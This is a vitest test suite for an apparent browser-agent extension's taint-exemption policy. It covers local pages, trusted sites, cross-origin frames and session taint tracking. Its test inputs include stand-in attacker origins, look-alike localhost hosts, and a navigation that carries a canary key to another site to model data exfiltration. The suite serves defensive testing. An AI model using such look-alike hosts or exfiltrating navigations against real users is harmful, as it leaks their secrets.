// @vitest-environment jsdom
/**
 * Taint exemptions (security/taint-exempt.ts, policy-runtime.ts): the user's
 * own local pages and sites the user explicitly trusts do not taint a
 * session. Everything else taints as before, and the exemption never changes
 * where a tainted session's data may go.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { PolicyRuntime, POLICY_PORT_NAME, type PolicySettings, type TabProvenance, type TaintTrustChange } from '../src/background/policy-runtime.ts'
import { callPolicyTargets, tabProvenanceOf } from '../src/background/authorization.ts'
import { parseManagedPolicy, type ManagedPolicy } from '../src/security/managed-policy.ts'
import { MAX_EXEMPT_READS, taintForcedReasons, UNKNOWN_SOURCE } from '../src/security/taint.ts'
import {
  allTaintExempt,
  isLoopbackPageOrigin,
  NO_TAINT_EXEMPTION,
  normalizeTaintLocalOrigins,
  normalizeTaintTrustedSites,
  originTaintExempt,
  reconcileTrustConfirmed,
  servesBridge,
  stricterRuleCovers,
  TAINT_EXEMPTION_SWITCHES,
  trustOfferFor,
  unconfirmedTrust,
  userTrustsOrigin,
  type LoopbackScope,
  type TaintExemptionConfig,
  type TrustedMigration,
} from '../src/security/taint-exempt.ts'
import { memoryStorage } from './support/chrome.ts'

beforeEach(() => {
  vi.stubGlobal('chrome', {
    runtime: { id: 'ext', getURL: (path: string) => `chrome-extension://ext/${path}` },
    storage: {},
  } as unknown as typeof chrome)
})
afterEach(() => { vi.unstubAllGlobals() })

const LOCAL = 'http://localhost:3000'
const LOCAL_IP = 'http://127.0.0.1:5173'
const EVIL = 'https://evil.example'
const TRUSTED = 'https://seraph.quest' // a user `trusted` site rule
const ALWAYS = 'https://tickets.corp.example' // an always-allowed origin
const TAINT_ONLY = 'https://wiki.example' // a "not treated as untrusted" entry

interface Harness {
  policy: PolicyRuntime
  settings: PolicySettings
  clearBridgeTaint: ReturnType<typeof vi.fn>
  saved: TaintTrustChange[]
  /** Blanket "unrestricted browser access". */
  unrestricted: { on: boolean }
  bridge: { caps: { local: boolean; trusted: boolean } | undefined }
}

interface HarnessOptions {
  managed?: ManagedPolicy
  loopbackScope?: LoopbackScope
  trustedMigration?: TrustedMigration
  neverExemptOrigin?: (origin: string) => boolean
}

/** Everything confirmed, as after the user answered the one-time questions. */
function harness(overrides: Partial<PolicySettings> = {}, options: HarnessOptions = {}): Harness {
  const settings: PolicySettings = {
    siteRules: [{ pattern: 'seraph.quest', rule: 'trusted' }],
    siteDefaultsEnabled: true,
    trustedActionOrigins: [ALWAYS],
    taintExemptLocalPages: true,
    taintExemptTrustedSites: true,
    taintLocalOrigins: [LOCAL, LOCAL_IP],
    taintTrustedSites: ['wiki.example'],
    taintTrustConfirmed: ['rule:seraph.quest', `origin:${ALWAYS}`],
    ...overrides,
  }
  const clearBridgeTaint = vi.fn(async () => {})
  const saved: TaintTrustChange[] = []
  const unrestricted = { on: false }
  const bridge: Harness['bridge'] = { caps: undefined }
  const policy = new PolicyRuntime({
    settings: () => settings,
    unrestricted: () => unrestricted.on,
    clearBridgeTaint,
    saveTaintTrust: async (change) => {
      saved.push(change)
      settings.taintTrustedSites = [...settings.taintTrustedSites ?? [], ...change.sites]
      settings.taintLocalOrigins = [...settings.taintLocalOrigins ?? [], ...change.localOrigins]
    },
    bridgeExemptions: () => bridge.caps,
    switches: { loopbackScope: options.loopbackScope ?? 'confirmed', trustedMigration: options.trustedMigration ?? 'confirm' },
    ...options.neverExemptOrigin === undefined ? {} : { neverExemptOrigin: options.neverExemptOrigin },
  })
  if (options.managed !== undefined) policy.setManaged(options.managed)
  return { policy, settings, clearBridgeTaint, saved, unrestricted, bridge }
}

let callSeq = 0

/** One page read: the policy hook sees `targets`, then the result is recorded. */
function read(h: Harness, sessionId: string, origins: string[], extra: { name?: string; pageOrigin?: string; after?: TabProvenance; urls?: string[]; quotesConsole?: boolean } = {}) {
  const id = `call-${callSeq += 1}`
  const name = extra.name ?? 'browser_snapshot'
  const call = { id, name, args: {}, sessionId }
  h.policy.hook(id, sessionId, h.unrestricted.on)(call, { reads: origins, acts: [], pageOrigin: extra.pageOrigin ?? origins[0]!, ...extra.urls === undefined ? {} : { urls: extra.urls } })
  return h.policy.recordResult(call, true, undefined, extra.after, extra.quotesConsole === true ? { quotesConsole: true } : {})
}

function navigate(h: Harness, sessionId: string, url: string) {
  const id = `call-${callSeq += 1}`
  const call = { id, name: 'browser_navigate', args: { url }, sessionId }
  const decision = h.policy.hook(id, sessionId, h.unrestricted.on)(call, { reads: [], acts: [], destination: url })
  return { decision, call }
}

const typeInto = (h: Harness, sessionId: string, origin: string) =>
  taintForcedReasons({ name: 'browser_type', args: { text: 'SECRET-0123456789abcdef' }, targetOrigin: origin }, h.policy.get(sessionId))

const config = (overrides: Partial<TaintExemptionConfig> = {}): TaintExemptionConfig => ({
  localPages: true,
  trustedSites: true,
  site: { managed: [], user: [{ pattern: 'seraph.quest', rule: 'trusted' }], defaultsEnabled: true, defaultTrusted: false },
  trustedActionOrigins: [ALWAYS, 'https://*.docs.example'],
  localOrigins: [LOCAL],
  taintTrustedSites: ['wiki.example'],
  trustConfirmed: ['rule:seraph.quest', `origin:${ALWAYS}`, 'origin:https://*.docs.example'],
  loopbackScope: 'confirmed',
  trustedMigration: 'confirm',
  ...overrides,
})

describe('the two open decisions ship as the safer variants', () => {
  it('names one switch each', () => {
    expect(TAINT_EXEMPTION_SWITCHES).toEqual({ loopbackScope: 'confirmed', trustedMigration: 'confirm' })
  })
})

describe('what counts as a local page', () => {
  it('is the real connection target: localhost, *.localhost, 127.0.0.1, [::1], on any port', () => {
    for (const origin of [LOCAL, LOCAL_IP, 'http://localhost', 'https://localhost:8443', 'http://[::1]:8080', 'http://app.localhost:3000']) {
      expect(isLoopbackPageOrigin(origin), origin).toBe(true)
    }
  })

  it.each([
    'http://localhost.evil.com', 'http://localhost.evil.com:3000', 'http://127.0.0.1.nip.io', 'http://127.0.0.1.evil.example:5173',
    'http://localhost@evil.example', 'http://evil.example/localhost', 'http://evil.example#localhost', 'http://xlocalhost',
    'http://localhost.', 'http://127.0.0.2', 'http://0.0.0.0', 'http://10.0.0.1', 'file:///home/me/page.html', 'null', UNKNOWN_SOURCE, '',
  ])('%s is not loopback', (origin) => {
    expect(isLoopbackPageOrigin(origin)).toBe(false)
  })

  it('scope "confirmed" (default): only loopback origins the user said are theirs', () => {
    expect(originTaintExempt(LOCAL, config())).toBe(true)
    expect(originTaintExempt('http://localhost:8080', config())).toBe(false)
    expect(originTaintExempt(LOCAL_IP, config())).toBe(false)
    // A stored entry that is not loopback never counts, whatever the list says.
    expect(originTaintExempt('http://localhost.evil.com:3000', config({ localOrigins: ['http://localhost.evil.com:3000'] }))).toBe(false)
    expect(normalizeTaintLocalOrigins(['http://localhost:3000/app', 'http://evil.example', 'http://localhost.evil.com', 'http://[::1]:9', 7])).toEqual(['http://[::1]:9', LOCAL])
  })

  it('scope "any": every loopback origin', () => {
    const any = config({ loopbackScope: 'any', localOrigins: [] })
    expect(originTaintExempt(LOCAL, any)).toBe(true)
    expect(originTaintExempt('http://localhost:8080', any)).toBe(true)
    expect(originTaintExempt('http://localhost.evil.com', any)).toBe(false)
  })

  it('F7: a stricter site rule on a local address wins over the exemption', () => {
    for (const rule of ['blocked', 'read-only', 'ask'] as const) {
      const strict = config({ site: { managed: [], user: [{ pattern: 'localhost', rule }], defaultsEnabled: true, defaultTrusted: false } })
      expect(originTaintExempt(LOCAL, strict), rule).toBe(false)
    }
    const managed = config({ loopbackScope: 'any', site: { managed: [{ pattern: '127.0.0.1', rule: 'ask' }], user: [], defaultsEnabled: true, defaultTrusted: false } })
    expect(originTaintExempt(LOCAL_IP, managed)).toBe(false)
    expect(originTaintExempt(LOCAL, managed)).toBe(true)
  })

  it('F1: whatever serves the DSH host is never exempt', () => {
    expect(servesBridge('http://localhost:3080', ['ws://127.0.0.1:3080/ext/bridge'])).toBe(true)
    expect(servesBridge('http://127.0.0.1:3080', ['ws://127.0.0.1:3080/ext/bridge'])).toBe(true)
    expect(servesBridge('http://[::1]:3080', [undefined, '', 'ws://localhost:3080/ext/bridge'])).toBe(true)
    expect(servesBridge('http://localhost:3000', ['ws://127.0.0.1:3080/ext/bridge'])).toBe(false)
    expect(servesBridge('https://dsh.corp.example', ['wss://dsh.corp.example/ext/bridge'])).toBe(true)
    expect(servesBridge('https://dsh.corp.example:8443', ['wss://dsh.corp.example/ext/bridge'])).toBe(false)
    expect(servesBridge('https://other.example', ['wss://dsh.corp.example/ext/bridge', 'not a url'])).toBe(false)
    const h = harness({ taintLocalOrigins: [LOCAL, 'http://localhost:3080'] }, { neverExemptOrigin: (origin) => servesBridge(origin, ['ws://127.0.0.1:3080/ext/bridge']) })
    expect(read(h, 's1', ['http://localhost:3080'])).toEqual({ exempt: false })
    expect(read(h, 's2', [LOCAL])).toMatchObject({ exempt: true })
    expect(h.policy.trustable()).toEqual({})
  })
})

describe('what counts as a site the user trusts', () => {
  it('a taint-only entry, a user `trusted` site rule and an always-allowed origin all count, over https', () => {
    for (const origin of [TRUSTED, 'https://app.seraph.quest', ALWAYS, 'https://a.docs.example', TAINT_ONLY, 'https://en.wiki.example']) {
      expect(userTrustsOrigin(origin, config()), origin).toBe(true)
    }
    expect(userTrustsOrigin(EVIL, config())).toBe(false)
    expect(userTrustsOrigin('https://seraph.quest.evil.example', config())).toBe(false)
    expect(userTrustsOrigin('https://notwiki.example', config())).toBe(false)
  })

  it('F2: never over plain http, and a host entry covers the default port only', () => {
    // A network attacker can serve http://<trusted host>.
    for (const origin of ['http://seraph.quest', 'http://wiki.example', 'http://tickets.corp.example']) {
      expect(userTrustsOrigin(origin, config()), origin).toBe(false)
    }
    expect(userTrustsOrigin('https://seraph.quest:8443', config())).toBe(false)
    expect(userTrustsOrigin('https://wiki.example:8443', config())).toBe(false)
    // An always-allowed origin covers exactly what it names, port included, but only https.
    expect(userTrustsOrigin('https://corp.example:8443', config({ trustedActionOrigins: ['https://corp.example:8443'], trustConfirmed: ['origin:https://corp.example:8443'] }))).toBe(true)
    expect(userTrustsOrigin('http://corp.example', config({ trustedActionOrigins: ['http://corp.example'], trustConfirmed: ['origin:http://corp.example'] }))).toBe(false)
  })

  it('the blanket unrestricted switch is not a choice about any site', () => {
    const blanket = config({ site: { managed: [], user: [], defaultsEnabled: true, defaultTrusted: true }, trustedActionOrigins: [], taintTrustedSites: [] })
    expect(originTaintExempt(EVIL, blanket)).toBe(false)
  })

  it('a stricter rule from any layer wins, and an administrator rule is not the user\'s choice', () => {
    const withSite = (site: TaintExemptionConfig['site']) => config({ site })
    expect(originTaintExempt(TRUSTED, withSite({ managed: [{ pattern: 'seraph.quest', rule: 'ask' }], user: [{ pattern: 'seraph.quest', rule: 'trusted' }], defaultsEnabled: true, defaultTrusted: false }))).toBe(false)
    expect(originTaintExempt(ALWAYS, withSite({ managed: [], user: [{ pattern: 'tickets.corp.example', rule: 'read-only' }], defaultsEnabled: true, defaultTrusted: false }))).toBe(false)
    expect(originTaintExempt(TAINT_ONLY, withSite({ managed: [], user: [{ pattern: 'wiki.example', rule: 'ask' }], defaultsEnabled: true, defaultTrusted: false }))).toBe(false)
    expect(originTaintExempt('https://intranet.example', withSite({ managed: [{ pattern: 'intranet.example', rule: 'trusted' }], user: [], defaultsEnabled: true, defaultTrusted: false }))).toBe(false)
    // A built-in read-only default (a bank) is not lifted by any trust entry, a user `trusted` rule included.
    expect(originTaintExempt('https://paypal.com', config({ trustedActionOrigins: ['https://paypal.com'], trustConfirmed: ['origin:https://paypal.com'] }))).toBe(false)
    expect(originTaintExempt('https://paypal.com', config({ site: { managed: [], user: [{ pattern: 'paypal.com', rule: 'trusted' }], defaultsEnabled: true, defaultTrusted: false }, trustConfirmed: ['rule:paypal.com'] }))).toBe(false)
  })

  it('F2: a path-scoped stricter rule blocks pages under that path, and the whole host when the page is unknown', () => {
    const github = config({ taintTrustedSites: ['github.com'] })
    const site = github.site
    // The built-in `github.com/settings` read-only rule.
    expect(stricterRuleCovers('https://github.com', ['https://github.com/settings/tokens'], site)).toBe(true)
    expect(stricterRuleCovers('https://github.com', ['https://github.com/me/repo'], site)).toBe(false)
    expect(stricterRuleCovers('https://github.com', [], site)).toBe(true)
    expect(originTaintExempt('https://github.com', github, ['https://github.com/me/repo/issues/1'])).toBe(true)
    expect(originTaintExempt('https://github.com', github, ['https://github.com/me/repo', 'https://github.com/settings/profile'])).toBe(false)
    expect(originTaintExempt('https://github.com', github)).toBe(false)
    // A path-scoped trusted rule does not make the whole origin trusted.
    expect(userTrustsOrigin('https://example.org', config({ site: { managed: [], user: [{ pattern: 'example.org/app', rule: 'trusted' }], defaultsEnabled: false, defaultTrusted: false }, trustConfirmed: ['rule:example.org/app'] }))).toBe(false)
    // End to end through the policy layer: the frame URLs the call named decide.
    const h = harness({ taintTrustedSites: ['github.com'] })
    expect(read(h, 's1', ['https://github.com'], { urls: ['https://github.com/me/repo'] })).toMatchObject({ exempt: true })
    expect(read(h, 's2', ['https://github.com'], { urls: ['https://github.com/settings/keys'] })).toEqual({ exempt: false })
    expect(read(h, 's3', ['https://github.com'])).toEqual({ exempt: false })
  })

  it('migration "confirm" (default): rules and always-allowed origins that predate the exemption wait for the user', () => {
    const before = config({ trustConfirmed: [] })
    expect(userTrustsOrigin(TRUSTED, before)).toBe(false)
    expect(userTrustsOrigin(ALWAYS, before)).toBe(false)
    // A taint-only entry was added knowing what it means: it always counts.
    expect(userTrustsOrigin(TAINT_ONLY, before)).toBe(true)
    expect(unconfirmedTrust(before)).toEqual(['rule:seraph.quest', `origin:${ALWAYS}`, 'origin:https://*.docs.example'])
    expect(userTrustsOrigin(TRUSTED, config({ trustConfirmed: ['rule:seraph.quest'] }))).toBe(true)
    expect(userTrustsOrigin(ALWAYS, config({ trustConfirmed: ['rule:seraph.quest'] }))).toBe(false)
    expect(unconfirmedTrust(config())).toEqual([])
  })

  it('migration "immediate": every existing entry counts at once', () => {
    const immediate = config({ trustConfirmed: [], trustedMigration: 'immediate' })
    expect(userTrustsOrigin(TRUSTED, immediate)).toBe(true)
    expect(userTrustsOrigin(ALWAYS, immediate)).toBe(true)
    expect(unconfirmedTrust(immediate)).toEqual([])
  })

  it('an entry added now is confirmed by adding it; existing ones are not; removed ones are forgotten', () => {
    const previous = { siteRules: [{ pattern: 'old.example', rule: 'trusted' as const }], trustedActionOrigins: ['https://old-allowed.example'] }
    const next = {
      siteRules: [{ pattern: 'old.example', rule: 'trusted' as const }, { pattern: 'new.example', rule: 'trusted' as const }, { pattern: 'ask.example', rule: 'ask' as const }],
      trustedActionOrigins: ['https://old-allowed.example', 'https://new-allowed.example'],
    }
    expect(reconcileTrustConfirmed(previous, next, [])).toEqual(['origin:https://new-allowed.example', 'rule:new.example'])
    // "Keep all" in Settings confirms the old ones.
    expect(reconcileTrustConfirmed(previous, next, ['rule:old.example', 'origin:https://old-allowed.example'])).toEqual([
      'origin:https://new-allowed.example', 'origin:https://old-allowed.example', 'rule:new.example', 'rule:old.example',
    ])
    expect(reconcileTrustConfirmed(next, previous, ['rule:new.example', 'rule:old.example'])).toEqual(['rule:old.example'])
  })

  it('stored taint-only entries are narrow host names', () => {
    expect(normalizeTaintTrustedSites(['Wiki.Example', 'https://x.com/', '*.com', '*bank*', 'x.com/path', '192.168.1.1', 'localhost', 7])).toEqual(['wiki.example', 'x.com'])
  })

  it('needs at least one origin, and an unknown source is never exempt', () => {
    expect(allTaintExempt([], config())).toBe(false)
    expect(allTaintExempt([LOCAL, TRUSTED, ALWAYS, TAINT_ONLY], config())).toBe(true)
    expect(allTaintExempt([LOCAL, UNKNOWN_SOURCE], config())).toBe(false)
    expect(allTaintExempt([LOCAL, EVIL], config())).toBe(false)
    expect(allTaintExempt([LOCAL], NO_TAINT_EXEMPTION)).toBe(false)
  })
})

describe('local pages do not taint', () => {
  it('a session that only read the user\'s local pages stays untainted and gets no forced card', () => {
    const h = harness()
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: true, local: true })
    expect(read(h, 's1', [LOCAL_IP])).toEqual({ exempt: true, local: true })
    expect(h.policy.get('s1')).toBeUndefined()
    const clipboard = { id: 'c', name: 'browser_clipboard', args: { action: 'write', text: 'x' }, sessionId: 's1' }
    expect(h.policy.evaluate(clipboard, { reads: [], acts: [] }).kind).not.toBe('force')
    expect(navigate(h, 's1', 'https://other.example/c?k=sk-canary-800b3920a5708f56').decision.kind).not.toBe('force')
  })

  it('a loopback origin the user never confirmed taints (default scope), and is exempt under scope "any"', () => {
    const h = harness()
    expect(read(h, 's1', ['http://localhost:9999'])).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual(['http://localhost:9999'])
    const any = harness({ taintLocalOrigins: [] }, { loopbackScope: 'any' })
    expect(read(any, 's1', ['http://localhost:9999'])).toEqual({ exempt: true, local: true })
  })

  it('loopback then external: tainted, and the earlier local pages are sources too', () => {
    const h = harness()
    read(h, 's1', [LOCAL])
    expect(read(h, 's1', [EVIL])).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([LOCAL, EVIL].sort())
    // The attacker page is not the "only source": typing what the local page showed into it still asks.
    expect(typeInto(h, 's1', EVIL)).not.toEqual([])
  })

  it('external then loopback: still tainted, and the bridge is not told otherwise', () => {
    const h = harness()
    read(h, 's1', [EVIL])
    expect(read(h, 's1', [LOCAL])).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([EVIL, LOCAL].sort())
  })

  it.each(['http://localhost.evil.com:3000', 'http://127.0.0.1.nip.io', 'http://localhost.attacker.test:8080'])('a look-alike host taints: %s', (origin) => {
    const h = harness({ taintLocalOrigins: [LOCAL, origin] }, { loopbackScope: 'any' })
    expect(read(h, 's1', [origin])).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([origin])
  })

  it('a loopback page whose cross-origin frame was included taints', () => {
    const h = harness()
    const frames = [
      { frameId: 0, parentFrameId: -1, url: `${LOCAL}/` },
      { frameId: 4, parentFrameId: 0, url: `${EVIL}/widget` },
    ]
    // The real target computation: a whole-tab read names every frame.
    const snapshot = { id: 'snap', name: 'browser_snapshot', args: {}, sessionId: 's1' }
    h.policy.hook('snap', 's1', false)(snapshot, callPolicyTargets(snapshot, frames))
    expect(h.policy.recordResult(snapshot, true, LOCAL, tabProvenanceOf(frames))).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([EVIL, LOCAL].sort())
    // Reading only the top frame of the same page stays exempt...
    const text = { id: 'text', name: 'browser_get_text', args: {}, sessionId: 's2' }
    h.policy.hook('text', 's2', false)(text, callPolicyTargets(text, frames))
    expect(h.policy.recordResult(text, true, LOCAL, tabProvenanceOf(frames))).toMatchObject({ exempt: true })
    // ...and reading the embedded frame itself does not.
    const inner = { id: 'inner', name: 'browser_get_text', args: { frame: 4 }, sessionId: 's3' }
    h.policy.hook('inner', 's3', false)(inner, callPolicyTargets(inner, frames))
    expect(h.policy.recordResult(inner, true, LOCAL, tabProvenanceOf(frames))).toEqual({ exempt: false })
  })

  it('F5: console text, screenshots, PDFs and developer-tools reads are exempt only when the whole tab is the user\'s own local pages', () => {
    const h = harness()
    const frames = [
      { frameId: 0, parentFrameId: -1, url: `${LOCAL}/` },
      { frameId: 4, parentFrameId: 0, url: `${EVIL}/widget` },
    ]
    // A click on the top frame of a local page: exempt on its own...
    const click = { id: 'click', name: 'browser_click', args: { index: 1 }, sessionId: 's1' }
    h.policy.hook('click', 's1', false)(click, callPolicyTargets(click, frames))
    expect(h.policy.recordResult(click, true, LOCAL, tabProvenanceOf(frames))).toMatchObject({ exempt: true })
    // ...but not when its result quotes console errors and another site's frame is in the tab.
    const noisy = { id: 'noisy', name: 'browser_click', args: { index: 1 }, sessionId: 's2' }
    h.policy.hook('noisy', 's2', false)(noisy, callPolicyTargets(noisy, frames))
    expect(h.policy.recordResult(noisy, true, LOCAL, tabProvenanceOf(frames), { quotesConsole: true })).toEqual({ exempt: false })
    // A tab of only the user's own local page: console text is the dev server's own (as the dev loop reports it).
    expect(read(h, 's3', [LOCAL], { name: 'browser_type', quotesConsole: true, after: { top: LOCAL, frames: [LOCAL], opaque: false } })).toEqual({ exempt: true, local: true })
    // The tab unknown: taints.
    expect(read(h, 's3b', [LOCAL], { name: 'browser_type', quotesConsole: true })).toEqual({ exempt: false })
    for (const name of ['browser_screenshot', 'browser_save_pdf']) {
      // Pixels of a local-only tab: exempt.
      expect(read(h, `s-${name}`, [LOCAL], { name, after: { top: LOCAL, frames: [LOCAL], opaque: false } }), name).toEqual({ exempt: true, local: true })
      expect(h.policy.get(`s-${name}`)).toBeUndefined()
      // A cross-origin frame, an unconfirmed loopback origin, or a trusted remote site: taints.
      expect(read(h, `x-${name}`, [LOCAL], { name, after: { top: LOCAL, frames: [LOCAL, EVIL], opaque: false } }), name).toEqual({ exempt: false })
      // A frame no web origin vouches for (a data: page a widget navigated itself to): taints.
      expect(read(h, `d-${name}`, [LOCAL], { name, after: { top: LOCAL, frames: [LOCAL], opaque: false, unvouchable: true } }), name).toEqual({ exempt: false })
      expect(read(h, `u-${name}`, ['http://localhost:8080'], { name, after: { top: 'http://localhost:8080', frames: ['http://localhost:8080'], opaque: false } }), name).toEqual({ exempt: false })
      expect(read(h, `t-${name}`, [TRUSTED], { name, after: { top: TRUSTED, frames: [TRUSTED], opaque: false } }), name).toEqual({ exempt: false })
      expect(h.policy.get(`t-${name}`)).toBeDefined()
    }
  })

  it('a loopback frame inside an external page taints (the top page counts)', () => {
    const h = harness()
    expect(read(h, 's1', [LOCAL], { name: 'browser_get_text', pageOrigin: EVIL })).toEqual({ exempt: false })
  })

  it('a call that never named its frame is exempt only when every frame in the tab is', () => {
    const h = harness()
    const failed = (id: string, sessionId: string, after?: TabProvenance) => h.policy.recordResult({ id, name: 'browser_click', sessionId }, false, LOCAL, after)
    // No frame provenance at all: taints.
    expect(failed('f1', 's1')).toEqual({ exempt: false })
    // An error can quote any frame (an open dialog's text): a cross-origin frame taints.
    expect(failed('f2', 's2', { top: LOCAL, frames: [LOCAL, EVIL], opaque: false })).toEqual({ exempt: false })
    expect(failed('f3', 's3', { top: LOCAL, frames: [LOCAL], opaque: false })).toMatchObject({ exempt: true })
    expect(h.policy.get('s3')).toBeUndefined()
    // browser_dialog answers a dialog any frame may have opened.
    const dialog = { id: 'd', name: 'browser_dialog', args: { accept: true }, sessionId: 's4' }
    h.policy.hook('d', 's4', false)(dialog, { reads: [], acts: [LOCAL], pageOrigin: LOCAL })
    expect(h.policy.recordResult(dialog, true, LOCAL, { top: LOCAL, frames: [LOCAL, EVIL], opaque: false })).toEqual({ exempt: false })
  })

  it('a navigation the call or the page caused meanwhile counts: the tab now shows an external page', () => {
    const h = harness()
    expect(read(h, 's1', [LOCAL], { name: 'browser_click', after: { top: EVIL, frames: [EVIL], opaque: false } })).toEqual({ exempt: false })
    // A navigation is judged on the page it landed on (a redirect off the local server).
    const call = { id: 'nav', name: 'browser_navigate', args: { url: `${LOCAL}/go` }, sessionId: 's2' }
    const hook = h.policy.hook('nav', 's2', false)
    hook(call, { reads: [], acts: [], destination: `${LOCAL}/go` })
    hook({ ...call, name: 'browser_snapshot', args: {} }, { reads: [EVIL], acts: [], pageOrigin: EVIL })
    expect(h.policy.recordResult(call, true, LOCAL)).toEqual({ exempt: false })
    expect(h.policy.get('s2')).toBeDefined()
  })

  it('content of unknown source always taints: no origin, a non-web destination, host lineage, an attachment without a URL', () => {
    const h = harness()
    // A result with no origin at all (a tool this layer has no provenance for).
    expect(h.policy.recordResult({ id: 'x1', name: 'browser_fanout', sessionId: 's1' }, true)).toEqual({ exempt: false })
    expect(h.policy.get('s1')).toBeDefined()
    const { call } = navigate(h, 's2', 'about:blank')
    expect(h.policy.recordResult(call, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false })).toEqual({ exempt: false })
    h.policy.markHostTaint('s3')
    expect(h.policy.get('s3')?.sources).toEqual([UNKNOWN_SOURCE])
    expect(read(h, 's3', [LOCAL])).toEqual({ exempt: false })
    expect(h.policy.recordSelection('s4', undefined)).toEqual({ exempt: false })
    expect(h.policy.get('s4')?.sources).toEqual([UNKNOWN_SOURCE])
    // Developer-tools output quotes whatever the page talked to: exempt only on a tab of the user's own local pages.
    // Captured network traffic quotes every host the page talked to: never exempt, even on a local tab.
    for (const name of ['browser_devtools_request_body', 'browser_devtools_get_request', 'browser_devtools_list_requests']) {
      const network = { id: `nw-${name}`, name, args: {}, sessionId: `nw-${name}` }
      expect(h.policy.recordResult(network, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false }), name).toEqual({ exempt: false })
    }
    for (const name of ['browser_console_logs', 'browser_console_eval', 'browser_devtools_elements']) {
      const devtools = { id: `dt-${name}`, name, args: {}, sessionId: `dt-${name}` }
      h.policy.hook(devtools.id, devtools.sessionId, false)(devtools, { reads: [LOCAL], acts: [], pageOrigin: LOCAL })
      expect(h.policy.recordResult(devtools, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false }), name).toEqual({ exempt: true, local: true })
      // Also on the path the worker takes for them: no recorded targets, only the tab.
      expect(h.policy.recordResult({ ...devtools, id: `${devtools.id}-bare`, sessionId: `${devtools.sessionId}-bare` }, true, undefined, { top: LOCAL, frames: [LOCAL], opaque: false }), name).toEqual({ exempt: true, local: true })
      // Tab unknown, another site's frame, or a trusted remote site: taints.
      expect(h.policy.recordResult({ ...devtools, id: `${devtools.id}-nt`, sessionId: `${devtools.sessionId}-nt` }, true, LOCAL), name).toEqual({ exempt: false })
      expect(h.policy.recordResult({ ...devtools, id: `${devtools.id}-x`, sessionId: `${devtools.sessionId}-x` }, true, LOCAL, { top: LOCAL, frames: [LOCAL, EVIL], opaque: false }), name).toEqual({ exempt: false })
      expect(h.policy.recordResult({ ...devtools, id: `${devtools.id}-t`, sessionId: `${devtools.sessionId}-t` }, true, TRUSTED, { top: TRUSTED, frames: [TRUSTED], opaque: false }), name).toEqual({ exempt: false })
    }
    // A fleet and a watcher taint as before, even with only local frames in the tab.
    for (const name of ['browser_fanout', 'browser_watch', 'browser_watches']) {
      expect(h.policy.recordResult({ id: `np-${name}`, name, sessionId: `np-${name}` }, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false }), name).toEqual({ exempt: false })
      expect(h.policy.get(`np-${name}`), name).toBeDefined()
    }
    // A program or series approval answers with fixed text: it neither taints nor vouches for anything.
    expect(h.policy.recordResult({ id: 'np-run', name: 'browser_run', sessionId: 'np-run' }, true, EVIL, { top: EVIL, frames: [EVIL], opaque: false })).toEqual({ exempt: false })
    expect(h.policy.get('np-run')).toBeUndefined()
    // In a session that already read a page, it adds no source: that page stays the only one.
    read(h, 'np-run-2', [EVIL])
    const sourcesBefore = h.policy.get('np-run-2')?.sources
    expect(sourcesBefore).toEqual([EVIL])
    h.policy.recordResult({ id: 'np-run-2', name: 'browser_run', sessionId: 'np-run-2' }, true)
    expect(h.policy.get('np-run-2')?.sources).toEqual(sourcesBefore)
    // A step of an approved program or series is the plain click, type or select it is.
    for (const name of ['browser_click', 'browser_type', 'browser_select']) {
      const step = { id: `step-${name}`, name, args: { index: 1 }, sessionId: `step-${name}`, program: { id: 'p1', step: 0 } }
      h.policy.hook(step.id, step.sessionId, false)(step, { reads: [], acts: [LOCAL], pageOrigin: LOCAL })
      expect(h.policy.recordResult(step, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false }), name).toMatchObject({ exempt: true })
      const away = { ...step, id: `away-${name}`, sessionId: `away-${name}` }
      h.policy.hook(away.id, away.sessionId, false)(away, { reads: [], acts: [EVIL], pageOrigin: EVIL })
      expect(h.policy.recordResult(away, true, EVIL), name).toEqual({ exempt: false })
    }
    // The list of past downloads names other sites, whatever the tab shows.
    const downloads = { id: 'dl', name: 'browser_downloads', args: {}, sessionId: 's5' }
    h.policy.hook('dl', 's5', false)(downloads, { reads: [], acts: [], pageOrigin: LOCAL })
    expect(h.policy.recordResult(downloads, true, LOCAL, { top: LOCAL, frames: [LOCAL], opaque: false })).toEqual({ exempt: false })
  })

  it('selections and injected snapshots follow the same rule', () => {
    const h = harness()
    expect(h.policy.recordSelection('s1', LOCAL, `${LOCAL}/page`)).toEqual({ exempt: true })
    expect(h.policy.get('s1')).toBeUndefined()
    expect(h.policy.recordSelection('s1', EVIL)).toEqual({ exempt: false })
    expect(h.policy.get('s1')?.sources).toEqual([EVIL, LOCAL].sort())
    // An injection without frame provenance always taints.
    expect(h.policy.recordInjection('s2', LOCAL)).toEqual({ exempt: false })
    expect(h.policy.injectionExempt('s3', LOCAL, [LOCAL])).toBe(true)
    expect(h.policy.restsOnLocalPage([LOCAL])).toBe(true)
    expect(h.policy.restsOnLocalPage([TRUSTED])).toBe(false)
    expect(h.policy.recordInjection('s3', LOCAL, [LOCAL])).toEqual({ exempt: true })
    expect(h.policy.injectionExempt('s3', LOCAL, [LOCAL, EVIL])).toBe(false)
    expect(h.policy.injectionExempt('s3', undefined, [LOCAL])).toBe(false)
    expect(h.policy.injectionExempt('s3', LOCAL, [])).toBe(false)
    expect(h.policy.recordInjection('s3', LOCAL, [LOCAL, EVIL])).toEqual({ exempt: false })
    expect(h.policy.injectionExempt('s3', LOCAL, [LOCAL])).toBe(false) // tainted now
    // The evaluator that collects a snapshot's frames.
    const provenance = h.policy.provenanceEvaluator('s4', false)
    expect(provenance.origins()).toBeUndefined()
    provenance.policy({ id: 'p', name: 'browser_snapshot', args: {} }, { reads: [LOCAL, EVIL], acts: [], pageOrigin: LOCAL, urls: [`${LOCAL}/a`, `${EVIL}/w`] })
    expect(provenance.origins()?.sort()).toEqual([EVIL, LOCAL].sort())
    expect(provenance.urls().sort()).toEqual([`${EVIL}/w`, `${LOCAL}/a`].sort())
  })
